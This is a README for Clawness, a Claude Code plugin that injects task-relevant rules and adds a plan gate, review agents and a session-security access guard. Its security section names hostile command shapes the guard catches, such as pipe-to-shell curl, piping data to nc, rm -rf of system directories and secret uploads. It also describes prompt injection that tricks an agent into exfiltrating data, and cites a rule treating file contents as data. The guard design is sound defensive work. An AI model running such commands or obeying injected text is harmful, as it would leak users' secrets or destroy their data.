# Clawness

[![CI](https://github.com/fullymiddleaged/Clawness/actions/workflows/ci.yml/badge.svg)](https://github.com/fullymiddleaged/Clawness/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/fullymiddleaged/Clawness)](https://github.com/fullymiddleaged/Clawness/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)

**Install once. Your coding agent gets the right rules for every task, without you having to mention them.**

Clawness is a Claude Code plugin aimed at people who often work across common codebases. It dynamically puts relevant rules into context on every prompt, whether you're shipping code or carrying out research. What's in the box:

- **195 rules** across 28 domains: coding, plus scientific computing, research method, and building with LLMs. Only the ones matching your task get injected.
- **7 adversarial review sub-agents**: security red/blue team, code critic, architecture challenger.
- **A plan-approval gate** before the first edit of a session, on by default.
- **Session security**: an access guard on dangerous tool calls, plus a trust ledger for skills, agents and MCP servers.
- **Session continuity**: a per-project lessons memory, a warning when your context window is filling up, and a handoff the next session picks up on its own.
- **Low token cost.** Putting all 195 rules in CLAUDE.md would cost about 32,600 tokens *every turn*. Clawness injects roughly 850 fixed plus only what matches, re-states the always-on block in full on just 1 prompt in 5, and compresses long command output. The per-project memory file is searched the same way the rules are, so a log of 200 lessons costs about what a log of 4 costs.

Install it once and it works across every project on your machine. Under 1 MB, no services, no models, about 2 ms per prompt.

Inspired by [infinri/Writ](https://github.com/infinri/Writ), rebuilt from ~2GB of infrastructure to pure Python.

---

## 30-Second Version

Installing the plugin takes **two commands plus a restart**. The plugin downloads its Python backend on first launch, so it isn't fully live until step 3.

**1. Install** (from any Claude Code session):

```bash
claude plugin marketplace add fullymiddleaged/clawness
claude plugin install clawness@clawness
```

**2. Restart Claude Code** (or run `/reload-plugins`) so the hooks actually load.

**3. Let first-run setup finish.** On the first session, a background hook installs Clawness's one dependency (**PyYAML**) into your environment. This needs **Python 3.10+ on your PATH** and takes a few seconds. Retrieval is pure-Python lexical and concept matching, so there are no models to download.

**4. Verify** by asking Claude:

```
what clawness rules do you see in your context?
```

If it describes the injected rule block, you're live. (`/clawness:status` also works.)

> `clawness@clawness` isn't a typo. It's `plugin@marketplace`, and both happen to be named *clawness*. No Python 3.10+? See [Installing Python](#installing-python-if-you-dont-have-it). Without it, the plugin installs but injects nothing.

---

## What Problem Does This Solve?

Clawness makes Claude Code work the way you do: **the right rules in context on every prompt, without you mentioning them, and without paying for the ones that don't apply.** The same retrieval method surfaces your project's own recorded lessons, so that file can grow for years without costing you more per prompt, and the plan gate, access guard and review agents all ride the same hook. One install, about 2 ms of overhead, no infrastructure. It applies to code and to research alike: see [For Researchers and Scientists](#for-researchers-and-scientists).

None of that is built in. Vanilla Claude Code forgets your conventions between turns, trusts every tool call you've ever allow-listed, and gives you no cheap way to enforce a standard or rein in a runaway edit. Clawness fills each gap, per prompt.

Take coding rules: *"parameterized SQL only," "async I/O end-to-end," "API responses use the envelope format."* Without Clawness you either dump them all into CLAUDE.md (wastes tokens, dilutes attention every turn) or mention them by hand (you forget, Claude forgets). With Clawness:

- **The right rules, every prompt.** 195 rules in YAML; a hook injects only the ones relevant to your task, plus an always-on mandatory set (security, testing, lessons-memory) — handy for full-stack developers moving between frontend, backend, and SQL in the same session. Nothing to remember, no context bloat.
- **A memory that learns your codebase.** When something challenging hits — a build flag this machine needs, a trap in a dependency, a constraint nobody wrote down — Claude records it as one line in `.clawness/memory.md`, and it's there in every future session. Commit that file and your whole team inherits the lessons. The part that makes it work: the log is **searched, not dumped**. Only the lessons matching what you're doing right now get injected, so it can grow to hundreds of entries without costing you any more per prompt than a handful would.
- **A plan-first gate.** The first edit of a session asks before it happens, working through Claude Code's own plan mode, so the agent can't rewrite half your repo before you've looked. One click, at most once per session, and never a hard block.
- **Session security.** An access guard asks you to confirm a tool call that looks like it's sending your data somewhere, or deleting something it shouldn't, *even when you've already allowed that tool*. That's the point: once you've allowed something, you stop reading the prompts. A trust ledger flags a skill, agent or MCP server that changed since last session.
- **Cleaner context.** Long bash output is compressed to the lines that matter, so a noisy install or test run doesn't eat your window.
- **Sessions that survive their own length.** Clawness reads your transcript and tells you when the context window is filling up, rather than letting quality degrade without warning. At that point it offers to write a handoff, which the *next* session in that project picks up automatically. No path to remember, nothing to ask for.
- **Adversarial review on tap.** Security red/blue team, code critic, architecture challenger, and more, one ask away. The judgment agents **run on whatever model you chose** (they inherit your session's tier, so Clawness never downgrades a security review behind your back), while the mechanical ones stay on a cheaper tier. They return findings tagged CONFIRMED/PLAUSIBLE; your main session spot-checks the high-stakes ones against the cited lines, or a quick repro, before acting. Vetted rather than rubber-stamped, and without re-reading everything the agent read.
- **A second opinion on your model tier.** On the first prompt of a session, if the task looks far deeper (or far more routine) than the model you're running, Clawness says so once. It suggests; it never switches anything.

**Make them *your* standards.** The 195 built-in rules are a starting point. Add your own in seconds: run `/clawness:add describe your rule` and Clawness writes the tagged YAML for you (asking before it saves), or drop `.yml` files in `.clawness/rules/`. Commit `.clawness/` and your whole team shares the same rules. → [Per-Project Setup](#per-project-setup) · [Writing Rules](#writing-rules)

> **Tripwire, not a sandbox.** The guard works by pattern-matching the agent's own tool calls. It catches honest mistakes, copy-pasted `curl … | sh`, reads of secrets outside your project, and data sent to a server that appears nowhere in your code, and it breaks the habit of approving everything without reading it. Someone determined can still disguise a command to get past it. The real protection is a container with a list of servers it's allowed to reach. It stays out of normal work: reading your own `.env`, plain API GETs, and traffic to your own machine aren't prompted. A call to an outside server that carries data or a token asks once per server. Disable with `CLAW_NO_ACCESS_GUARD=1`.

---

---

## For Researchers and Scientists

Clawness isn't only for shipping software. Physics, maths, and engineering work has its own
ways to go wrong, and 23 rules across `science/` and `research/` cover them, the same way
the coding rules work: injected automatically, with no command to remember. A further 21 cover
simulation and the languages that work is actually written in — CFD, Julia, Fortran, MATLAB
and R.

**Catching the errors that survive review.** A dimensionally inconsistent equation is wrong no
matter how reasonable the number looks. A float compared with `==` fails on the one input you
didn't try. A result quoted to five significant figures from two-figure inputs is a false claim
about how well the quantity is known. Ask a question and the relevant rule arrives with it:

| You ask | You get |
|---|---|
| *"check the units in this equation"* | `SCI-UNITS-001`: carry units, check dimensional consistency first |
| *"is this p value significant"* | `SCI-STATS-001`: multiple comparisons, effect size with a CI, not a bare p |
| *"my simulation results look wrong"* | `SCI-VALIDATE-001`: validate against a known analytic case before trusting it |
| *"make my numerical results reproducible"* | `SCI-REPRO-001`: pin seed, versions, data revision; record the command |
| *"is this idea actually novel"* | `RES-NOVELTY-001`: run the negative search; most reinvention is a vocabulary mismatch |
| *"find the frontier of this field"* | `RES-FRONTIER-001`: take it from what the field says is open, not from what you failed to find |
| *"is this mesh good enough"* | `CFD-MESH-001`: mesh quality and y+ decide whether the wall model you picked is even valid |
| *"the solver isn't converging"* | `CFD-CONVERGE-001`: falling residuals are not a converged answer; show grid convergence |
| *"speed up this MATLAB loop"* | `ML-VECTOR-001`: preallocate — `x(end+1)` copies the whole array every iteration |

**Doing the research, not just the code.** `research/` covers method: state a falsifiable
question before gathering, cite the primary source you actually opened rather than a summary of
it, keep what a source says separate from what you inferred, bound a literature sweep to the
present and state the cutoff, report disagreement instead of picking a side without saying so,
and produce a structured synthesis (established / contested / open) rather than forty per-paper
summaries.

**Simulation and the scientific languages.** Research doesn't get written in TypeScript. `cfd/`
covers the failure modes of a simulation you'll defend in a viva or a design review — mesh
quality and y+, residual convergence mistaken for grid convergence, Courant number and the
steady-vs-transient choice, and picking a turbulence model on grounds you can state. Alongside
it, `julia/`, `fortran/`, `matlab/` and `r/` carry four rules each on the traps specific to
those languages: type stability and allocation, `intent` and explicit precision, preallocation
and vectorised indexing, `NA` semantics and silent type coercion.

These five domains sit at the **highest** relevance bar, and deliberately so. Their vocabulary —
*solver, converge, residual, vectorize* — is also everyday programming vocabulary, so in a
Python web service "the solver isn't converging" gets you Python answers, not CFD ones. Inside a
project that actually is one of these (an OpenFOAM case directory, a `Project.toml`, a
`DESCRIPTION`), they're on-stack and the higher bar never applies.

**Prior art before you commit the effort.** Two rules fire on a build- or derive-shaped request
before the work starts: `GEN-PRIORART-001` for "is there already a library for this", and
`SCI-PRIORART-001` for "is this already equation 12 of a 2019 review". The costliest research
mistake is three weeks spent rediscovering a published negative result.

**Checking what a model hands you.** `SCI-DERIVE-001` applies with particular force to a
derivation an LLM produced, since fluent algebra with a sign error reads exactly like fluent
algebra. It asks for limiting cases, a dimensional check, symmetry, and a numerical spot-check
before you build on it. The always-on `ENF-VERIFY-001` backs this up on every turn: evidence
before assertion, and an explicit statement of what's verified versus assumed when a claim
can't be checked.

**It works where you actually work.** Clawness usually holds back rules for languages your
project doesn't use, but `science/` and `research/` are exempt on purpose: a directory holding
only `paper.tex`, or nothing at all yet, still gets them. Holding them back would silence these
rules exactly where they're needed. Detection also stacks up, so a repo with `paper.tex`
alongside `analysis.py` counts as both science and Python:

```bash
clawness query --stack science,python "is this derivation right"       # → SCI-DERIVE-001
clawness query --stack science,python "mutable default argument here"  # → PY-MUTABLE-001
```

One prompt gets the physics rule, the next gets the Python rule, in the same project, with no
mode to switch.

**Building with LLMs?** The `llm/` domain covers that too: eval sets instead of vibes for
prompt changes, schema-constrained output, prompt injection into tool-using agents, and never
asserting exact model text in a test. These rules *are* held back by project type, so they stay
out of projects that call no model.

---

## How It Works

```
You type a prompt in Claude Code
        │
        ▼
┌──────────────────────────┐
│  Hook: UserPromptSubmit  │  fires automatically before Claude sees your prompt
│  hooks/claude_hook.py    │
└──────────┬───────────────┘
           │
     ┌─────┴──────┐
     ▼            ▼
┌─────────┐  ┌──────────┐
│ GLOBAL  │  │ PROJECT  │    global rules from ~/.claude/clawness/rules/
│ rules   │  │ rules    │    project rules from <project>/.clawness/rules/
└────┬────┘  └────┬─────┘
     └──────┬─────┘
            ▼
┌──────────────────────────┐
│  BM25 + TF-IDF + RRF     │  hybrid lexical retrieval + concept expansion
│  + concept expansion     │  picks the top rules in ~2ms (pure Python)
│  context budget: 4000    │  stops adding rules when token budget is full
└──────────┬───────────────┘
           │
           ▼
┌──────────────────────────┐
│  Claude Code             │  sees: mandatory rules (always)
│  (your agent)            │      + relevant ranked rules (per-prompt)
│                          │      + your original prompt
└──────────────────────────┘
```

**In plain terms:** for each prompt, Clawness scores every rule by how well it matches your task, using shared keywords *and* concepts (login ↔ auth ↔ jwt bridges synonyms), then adds the few that fit plus the always-on mandatory ones. No models, no downloads, about 2 ms, and you never touch any of it.

**Two layers of rules:**
- **Global** (`~/.claude/clawness/rules/`): installed once, applies to every project.
- **Project** (`<your-project>/.clawness/rules/`): optional, layers on top for project-specific conventions. Commit to git so your whole team shares them.

### Retrieval engine

Pure Python, one dependency (PyYAML). No ML models, no embeddings, no services, nothing to download at query time:

- **BM25-Okapi and TF-IDF cosine, combined with Reciprocal Rank Fusion.** Two well-established word-matching methods that fail in different places, so a rule gets found whether your prompt shares its exact terms or just its general vocabulary.
- **Concept expansion (26 concept groups)** maps synonyms onto shared markers: `login ↔ auth ↔ jwt ↔ session`, `postgres ↔ db ↔ query`, `unwrap ↔ error ↔ exception`, applied to both the rules and your prompt. This is the "different words, same idea" reach a vector model gives, but instant and dependency-free. (Extend `_CONCEPT_GROUPS` in `clawness/core.py` to widen it.)
- **Light stemming** collapses plural and verb forms (`caches` → `cache`, `maintained` → `maintain`).
- **Mandatory rules** are always injected; the rest are ranked and capped by a token budget.
- **Your project memory is searched the same way.** `.clawness/memory.md` isn't pasted into context. It goes through the same search described above, so only the lessons that match your prompt are injected and a long log stays a few lines per turn. See [Project Memory](#project-memory-lessons-learned).

**Measured quality.** Run `clawness eval`: against 59 test questions with known right answers, **MRR@5 = 0.983** and **hit-rate = 1.000**, meaning every question found its expected rule, usually as the first result. CI enforces minimums on both, so search quality can't get worse unnoticed as rules are added.

**Cost.** About **2 ms per prompt**, and roughly 850 tokens of always-on mandatory rules, plus the few matched rules. The mandatory ones are written out in full on the first prompt and every fifth prompt after that; in between they're shortened to a single line listing their ids, since they haven't changed. Run `clawness stats` for your exact per-turn estimate.

---

## Install

### Installing Python (if you don't have it)

Clawness needs **Python 3.10+** on your PATH. Check first:

```bash
python --version     # or: python3 --version
```

If that prints `3.10` or higher, you're set, so skip to Option 1. Otherwise:

**Windows.** Install from [python.org/downloads](https://www.python.org/downloads/) and **tick "Add python.exe to PATH"** on the first screen. It's easy to miss, and it's the usual reason `python` "isn't found" later. Or with winget:

```powershell
winget install Python.Python.3.12
```

**macOS.** Usually preinstalled as `python3`. If not:

```bash
brew install python
```

**Linux.** Use your package manager:

```bash
sudo apt install python3      # Debian / Ubuntu
sudo dnf install python3      # Fedora / RHEL
sudo pacman -S python         # Arch
```

Then open a **new** terminal (so PATH refreshes) and re-run the check above.

### Option 1: Plugin Install (Recommended)

From any Claude Code session:

```bash
claude plugin marketplace add fullymiddleaged/clawness
claude plugin install clawness@clawness
```

The install registers the skills, agents, hooks, and rules, but it isn't live until you reload and the backend finishes setting up:

1. **Restart Claude Code** (or run `/reload-plugins`) so the hooks load.
2. **Let first-run setup finish.** On the first session a background hook installs PyYAML, which takes a few seconds. Details below.
3. **Verify** by asking Claude *"what clawness rules do you see in your context?"*, or run `/clawness:status`.

> **What runs on first launch.** The hooks are Python scripts, so **Python 3.10+ must be on your PATH**. Without it the plugin installs but injects nothing (see [Installing Python](#installing-python-if-you-dont-have-it)). On your first session a background `SessionStart` hook runs `pip install pyyaml`, the only dependency, in a few seconds, logged to `bootstrap.log`. The plan gate and access guard are on by default; disable with `CLAW_NO_PLAN_GATE=1` / `CLAW_NO_ACCESS_GUARD=1`.

### Option 2: Manual Install

For more control, or if the plugin system isn't available in your environment.

**Requirements:** Python 3.10+ (see [Installing Python](#installing-python-if-you-dont-have-it)) and Claude Code. No Docker, no Node, no databases, no ML models. Retrieval is pure-Python lexical and concept matching; PyYAML is the only dependency.

**Windows (PowerShell):**

```powershell
git clone https://github.com/fullymiddleaged/clawness.git "$env:USERPROFILE\.claude\clawness"
cd "$env:USERPROFILE\.claude\clawness"
powershell -ExecutionPolicy Bypass -File .\install.ps1
```

**macOS / Linux:**

```bash
git clone https://github.com/fullymiddleaged/clawness.git ~/.claude/clawness
cd ~/.claude/clawness
bash install.sh
```

### What the Manual Installer Does (7 steps)

| Step | What | Why |
|------|------|-----|
| 1 | Check Python 3.10+ | Finds `python` / `python3` / `py` |
| 2 | Install clawness + deps | Editable `pip install`, adds the `clawness` command and PyYAML (the only dependency) |
| 3 | Verify files | Confirms rules and hook scripts are present |
| 4 | Lint rules | Validates every `.yml` rule file |
| 5 | Test retrieval | Runs a test query to confirm the engine works |
| 6 | Install agents & skills | Copies to `~/.claude/agents/` and `~/.claude/skills/` |
| 7 | Configure hooks | Adds rule injection, output compression, the plan gate, session security (access guard + trust ledger), and the SessionStart helpers (git check, memory, stack detect) to `settings.json`, the same set the plugin install wires |

Running the installer twice does no harm. It won't duplicate hooks or overwrite existing settings.

### Uninstall

**Plugin install.** Use Claude Code's own command. The `/plugin` menu's remove is unreliable, so use the CLI:

```bash
claude plugin uninstall clawness
claude plugin marketplace remove clawness   # optional — also drops the marketplace
```

Add `--prune` to also clean up dependencies, and `--scope project` if you installed it at project scope.

**Manual install.** Don't just delete the folder: that leaves hook entries in `settings.json` pointing at missing scripts, which error on every prompt. Run the uninstaller first (it removes the hooks and the copied agents and skills), then delete the folder:

```bash
# macOS / Linux
bash ~/.claude/clawness/uninstall.sh
rm -rf ~/.claude/clawness

# Windows (PowerShell)
powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\.claude\clawness\uninstall.ps1"
Remove-Item -Recurse -Force "$env:USERPROFILE\.claude\clawness"
```

Two things are left in place on purpose, so remove them by hand if you want: the `pyyaml` pip package (shared with other tools), and any per-project rules in each project's `.clawness/`.

---

## Using It

### The Short Answer

**Just use Claude Code normally.** After installation, the hook fires silently on every prompt. You don't type anything special, you don't reference rules, you don't invoke agents. Claude sees the relevant rules in its context and follows them.

### What Claude Actually Sees

When you type *"implement the user registration endpoint"*, Claude receives this prepended to the conversation:

```
--- CLAWNESS RULES ---

# MANDATORY (9)
[ENF-CURRENT-001] (general/error)
  RULE: Always use current best practices for the present month and year...
[ENF-SEC-001] (security/error)
  RULE: All secrets must come from environment variables...
[ENF-SEC-004] (security/error)
  RULE: Use a proven auth library...
[ENF-VOICE-001] (general/error)
  RULE: Apply these rules silently. Never tell the user that a rule...
...

# RELEVANT (2)
[FA-PYDANTIC-001] (fastapi/error)
  WHEN: Defining request or response shapes for any endpoint.
  RULE: Define Pydantic models for every request body and response...
[GEN-VALIDATE-001] (general/error)
  WHEN: Receiving any input from users, APIs, files, or external systems.
  RULE: Validate and sanitize all external input at the boundary...

--- END CLAWNESS RULES ---
```

The mandatory rules always appear. The ranked rules change based on your prompt.
(Relevance scores and timing are hidden by default: they change every turn,
which would defeat prompt caching for no benefit to the model. Set
`CLAW_VERBOSE=1` to see them, or run `clawness query` directly.)

**Token cost.** A typical turn injects about **1,700 tokens**: roughly 850 fixed for the always-on mandatory block (rendered compactly, directive only, with no repeated examples) plus the selected ranked rules. `clawness stats` shows your exact estimate; tune with `CLAW_TOP_K` / `CLAW_BUDGET` / `CLAW_VERBOSE` / `CLAW_COMPACT`.

**Minimum match score, and awareness of your project.** Matched rules appear only when the prompt genuinely matches. Anything scoring below a minimum is treated as coincidence and dropped, and the `relevance=…` shown next to each rule *is* that score. Rules for languages and frameworks your project doesn't use have to score higher to get in, so a vague prompt in a Python repo won't pull in SQL or React noise, while a genuinely strong match from another language still gets through. `science` and `research` sit in between: they're never held back by project type, so a researcher in a bare or LaTeX-only directory still gets them, but they have to really match rather than drift into ordinary coding results. The CFD, Julia, Fortran, MATLAB and R rules sit at the opposite end — their words (solver, converge, residual, vectorize) are also everyday programming words, so outside a project that actually uses them they need a distinctly strong match before they appear, and "the solver isn't converging" in a Python repo gets you Python answers. Mandatory rules are always injected. Tune via `CLAW_MIN_RELEVANCE` / `CLAW_TOPICAL_MIN_RELEVANCE` / `CLAW_OFFSTACK_MIN_RELEVANCE` / `CLAW_NARROW_MIN_RELEVANCE` / `CLAW_NO_STACK_FILTER` (see [Configuration](#environment-variables)).

### Verify It's Working

- **Is it live?** Run `/clawness:status`, or ask *"what clawness rules do you see in your context?"* An active hook describes the injected rules.
- **Watch first-run setup:** launch once with `claude --debug`. Claude Code doesn't show hook output otherwise, and there's no progress bar in the interface.
- **Install record:** the first-session bootstrap logs each step to `bootstrap.log` in the plugin's data directory. Check it if rules aren't appearing.

### Output Compression

When Claude runs a bash command that produces 80+ lines of output (test suites, builds, long logs), the PostToolUse compression hook fires automatically. It extracts only the error and failure lines with context and provides a summary, keeping Claude's context clean for the next prompt.

**Content reads are exempt.** `cat`, `head`/`tail`, `grep`/`rg`, `git diff`, `git show` and friends return content Claude reasons about line by line. Compressing those would drop the middle of a file with no indication, and blank lines are structure there, not noise. They pass through whole; past about 400 lines they're truncated from the end with an explicit note saying how many lines are missing and to use Read/Grep for the rest. Build and test noise still compresses as before.

### Context Watch (on by default)

Long sessions get worse before they break. The window fills, older turns get squeezed
or auto-compacted, answers start drifting, and you're usually the last to know,
because nothing tells you the number until compaction happens *to* you.

Clawness reads your session's own transcript each prompt and tells you when it's time
to move on:

- **About 70% full:** a brief mention that a fresh session may be worth it soon,
  especially before starting anything big. Then it gets on with your request.
- **About 85% full:** a plain recommendation to start fresh, plus an offer to write a
  handoff first (what you were doing, current state, next steps) and append any
  durable lesson to `.clawness/memory.md`, so the next session starts warm.
- **Filling fast:** a single turn that adds a big chunk of the window (a few large
  file reads will do it) is flagged while you still have room to act, with a rough
  count of turns left at that rate.

Each level fires **at most once per session**. The condition stays true once reached,
and a warning that repeats every turn is one you'd learn to ignore.

The token count is exact, read from the transcript's usage records rather than
estimated. The *window size* is the guess: a 1M-context session records the same model
id as a 200k one, so Clawness reads the `[1m]` marker on your configured model in
`settings.json`, and corrects upward if it ever sees usage exceed the assumed window.
If it guesses wrong, set `CLAW_CONTEXT_LIMIT` explicitly. Turn the whole thing off with
`CLAW_NO_CONTEXT_WATCH=1`.

### Session Handoff (on by default)

The other half of the context watch. When it recommends a fresh session, it offers to
write a handoff first, and the next session in that project **picks it up on its own**:

```
Session 1, 87% full
  → "Context is nearly full. Want me to write a handoff before you start fresh?"
  → writes .clawness/handoff.md

Session 2, first message
  → "Last session left off mid-refactor of core.py — render_memory_block moved to
     memory.py, tests failing on budget truncation, nothing committed. Next step was
     fixing the tail truncation. Want to pick that up?"
```

You don't have to remember the file exists, know its path, or ask for it. A
SessionStart hook finds it at the project root (from any subdirectory) and injects the
content, so Claude opens with where you left off instead of a blank stare.

- **Say "carry on" and Claude carries on.** If your first message asks to continue,
  it goes straight to the handoff's next step and starts — no interview, no re-planning
  work you already scoped. That's the whole reason you wrote one. If you open with
  something else instead, it just tells you where things stood and waits.
- **Genuine blockers go under `## Open questions`.** That section is what makes "don't
  ask" safe: if a decision really is yours to make, it's written down and Claude asks
  that and only that. Usually it says "none".
- **The file being there is what marks it outstanding.** No age cutoff, no "done"
  flag, no guessing. It stays until something supersedes it.
- **One handoff at a time, and nothing is deleted.** Writing a new one moves the old
  to `.clawness/handoffs/done/<timestamp>.md` first, so the one live handoff is always
  the note that matters and you still keep the history. Same when you say the work
  is finished: it gets archived, not removed.
- **Ask for one any time**, with "write a handoff" or "wrap up for now". Rule
  `WF-HANDOFF-001` tells Claude the format, the exact path, and to archive first.
- **Durable lessons go in `.clawness/memory.md` instead**, which accumulates. A
  handoff is transient by design.
- **Gitignore it.** If you commit `.clawness/` to share rules and memory with your
  team, add `.clawness/handoff.md` to `.gitignore`. It's a note about what you
  personally had half-finished, not shared knowledge.

Off with `CLAW_NO_HANDOFF=1`.

### Plan Gate (on by default)

Clawness nudges a plan-first workflow: before the first file edit (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`) of a session, it **asks** you rather than editing blind. It works through Claude Code's **own plan mode**, so if you present a plan and approve it, the gate clears itself for the rest of the session with no prompt at all. No special commands are needed in the normal flow.

If Claude tries to edit before a plan is approved, you'll see a native **approve dialog** ("proceed without a plan?"). Approve it to let the edit through, or switch to plan mode (Shift+Tab) to plan first. Either way clears the gate for the rest of the session, so you're asked **at most once per session**. It's a prompt with a working Yes button, never a dead end, and the gate can't strand you behind a command.

**Headless works the same way, because it's the same signal.** `claude -p --permission-mode plan` plans and clears the gate exactly like Shift+Tab does. Run headless with `--permission-mode acceptEdits` (or `auto`/`dontAsk`/`bypassPermissions`), and the gate treats that the same as an approved dialog: you've already told Claude Code "edit without asking me" for the whole run, so there's nothing left to confirm and no prompt that could stall it. A plain headless run with no permission mode set behaves like an interactive session with no plan approved: gated, same as always.

**Turning it off is deliberately a global choice, not a per-project one.** Either set `CLAW_NO_PLAN_GATE=1` in your environment, which lasts as long as that shell, or put this in `~/.claude/clawness/config.json`, which applies to every project until you change it back:

```json
{ "plan_gate": { "enabled": false } }
```

There is no way to switch the gate off for a single project, and that's on purpose. A project-local kill switch is a file you write once and then forget, it never expires, and it announces nothing — so a gate that's been off for a month looks exactly like a gate that's working. (Clawness's own repo sat that way until we noticed. Versions before 1.5.0 had `clawness plan off` and `clawness plan approve`, which is how.) `clawness plan status` now reports whether the gate is on, and if it's off, which of the two switches did it.

**Version control:** the plan gate stops *unplanned* edits, but recovering from a *bad* edit is git's job, and Clawness doesn't reimplement checkpoints. If you open a project that isn't a git repo, a SessionStart check nudges Claude to ask whether you'd like to `git init`. It never initializes without your say-so. The check looks upward (cwd and its parents) *and* a few levels down, so opening a workspace or monorepo parent whose repos live in subfolders won't trigger a false "no git" nudge. Silence it with `CLAW_NO_GIT_CHECK=1`.

**Stack awareness:** at session start Clawness detects your project's stack from its files (the same detection as `clawness init`) and injects a one-line note, e.g. *"Detected project stack: Next.js 14.2, React 18.3, TypeScript 5.4"*, so Claude starts already knowing the ecosystem — and which MAJOR VERSIONS of it — instead of inferring it or writing for whatever release it last read about. Versions it can't read from your manifest are left off rather than guessed. It's a heuristic, stated as such, and it complements the per-prompt rule retrieval. Silence it with `CLAW_NO_STACK_NOTE=1`.

**Changelog upkeep:** a changelog written at release time is a commit list; the entry has to be written while the change is fresh. If your project has a `CHANGELOG.md`, a session-start note reminds Claude to add the line as part of the work rather than batching it up. If it doesn't, Claude offers **once — ever** to create one, and only creates it if you say yes; plenty of projects deliberately don't have one, so the question is asked once per project and then never again. Silence it with `CLAW_NO_CHANGELOG_CHECK=1`, or drop a `.clawness/changelog-check-off` marker in a project that should never be asked.

**Model-tier check:** you pick a model once and rarely revisit it. On the **first prompt of a session only**, Clawness compares the tier you're running against what the opening task looks like, and mentions a mismatch once:

- On a mid or small tier with work that reads as genuinely deep (architecture, migrations, concurrency, security, diagnosis, trade-offs) it notes a higher tier may suit it better.
- On your top tier with work that reads as clearly routine (a typo, a rename, a version bump) it notes a cheaper tier would do.

Three things keep it from becoming noise. It **suggests, never switches**, so nothing changes without you running `/model`. It hands Claude the *evidence* rather than a verdict, so a wrong guess is usually filtered out before it reaches you. And it speaks **at most once per project per tier**: stay where you are and it stays quiet; change tier and it re-arms.

The two directions are not symmetric, on purpose. A wrong "spend more" costs money you can see. A wrong "spend less" means you get a shallower answer on hard work and never find out, so a downgrade hint needs a strong signal, a short prompt, and the complete absence of any deep-work signal. Off with `CLAW_NO_MODEL_ADVISOR=1`.

### Session Security (access guard + trust ledger, on by default)

Two hooks defend the *session itself* against the agent's own tool calls: text hidden in a file or web page that tricks Claude into sending your data out or deleting something, a skill that's been tampered with, or you approving prompts without reading them. They're separate from the rule engine and add roughly zero tokens unless they fire.

**Access guard** (`PreToolUse`). Looks at each Bash/Write/Edit/Read call and, for the risky ones, makes you decide *even when you've already allowed that tool*, because a hook's decision overrides your permission list. That's the point: it breaks the "click approve on everything" reflex. Two outcomes:

- **`ask`** shows a confirmation you can approve or reject. It covers commands that are perfectly normal in one context and dangerous in another: pipe-to-shell (`curl … | sh`, like official installers), `git push --force` (but **not** `--force-with-lease`, which is allowed), writes **outside** the project root, reads of credential files **outside** the project (`~/.ssh`, `~/.aws`, another repo), named package installs, a recursive delete *under* a system dir (`rm -rf /var/cache/…`), data piped into a raw socket (`… | nc host`), **any** cloud-storage upload (`aws s3 cp … s3://…`, `gsutil`, `az blob`, asked even for a bucket your repo names, since anything can write a bucket name into your source), a network call to an **outside** server that carries data or a token (a POST/PUT with a body, an upload, or a `$TOKEN` in the request, whether or not the server appears in your codebase; appearing in it only keeps the call from being treated as data theft outright), downloading a URL with a credential-sounding name, and editing the guard's own config. You're **asked once per destination per session**: what it remembers is the server or bucket, not the exact command, so sending ten different files to the same place prompts once.
- **`deny`** is a **hard block** with no inline override (verified on the VS Code build: retrying just re-fires it). It's kept deliberately narrow, reserved for things you'd essentially never want a sleepy "yes" to push through: cloud-metadata endpoints, a recursive delete of a filesystem root, home, or a *system dir itself* (`rm -rf /`, `/etc`), reading a local secret file into a network command, uploading a local secret, and **putting the output of one command inside** (`$(…)`, backticks) an upload to a server that appears **nowhere** in your codebase, which is what data theft actually looks like. A plain token env var (`Bearer $API_TOKEN`) is routine auth and only *asks*; it never hard-blocks. To proceed past a deny you run it yourself in a terminal, or set `CLAW_NO_ACCESS_GUARD=1` and re-issue.

It is tuned to **stay out of normal dev work**. Reading your *own* project's `.env` or keys, plain API **GET**s, installs from a lockfile (`npm ci`, `pip install -r …`), traffic to your own machine, and `--force-with-lease` all stay silent. A call to an *outside* server carrying data or a token asks **once per server per session**. Writing that server's name into your own source keeps it a question rather than a hard block, but doesn't make it go away. Reaching *outside* the project for secrets, or editing the files that switch the guard off, also prompts. See the [tripwire caveat](#what-problem-does-this-solve): it reduces harm, it isn't a sandbox.

**Trust ledger** (`SessionStart`). Takes a fingerprint of your project's skills, agents, commands, and MCP servers the first time it sees each one, then tells you when one **appears or changes** between sessions, so a skill swapped out behind your back doesn't go unnoticed. `clawness audit-skills` checks those same files for the tell-tale signs of hidden instructions whenever you ask.

**Opt-outs:** `CLAW_NO_ACCESS_GUARD=1` and `CLAW_NO_TRUST_LEDGER=1`.

#### Why this matters: 2026 incidents

A tripwire, not a guarantee (see the [caveat above](#what-problem-does-this-solve)), but each piece answers something that actually happened in 2026:

- **"Miasma" / Mini Shai-Hulud npm worms:** self-replicating packages that steal SSH keys, `.env`, and cloud/CI secrets on install. `SEC-PKG-001` warns before installs; the guard prompts on secret-reads outside the project and flags data sent to an off-codebase host, hard-denying the reading-a-secret-into-a-network-call shape. [Microsoft](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/)
- **MaliciousCorgi VS Code "AI assistant" extensions (Jan 2026):** two fake AI coding extensions (~1.5M installs) remotely triggered to steal files out of the workspace. The guard flags data sent to a server that appears nowhere in your codebase, asking about it, or blocking outright when the command has file contents baked into it. `ENF-SEC-006` treats instructions found inside files as data, not orders. [The Hacker News](https://thehackernews.com/2026/01/malicious-vs-code-ai-extensions-with-15.html)
- **MCP became the top agent attack surface:** unauthenticated servers, poisoned configs, and an RCE in Anthropic's official MCP SDK across 7,000+ servers. The trust ledger fingerprints your project's MCP servers, skills and agents, and flags any that appear or change since last session. [The Hacker News](https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html)
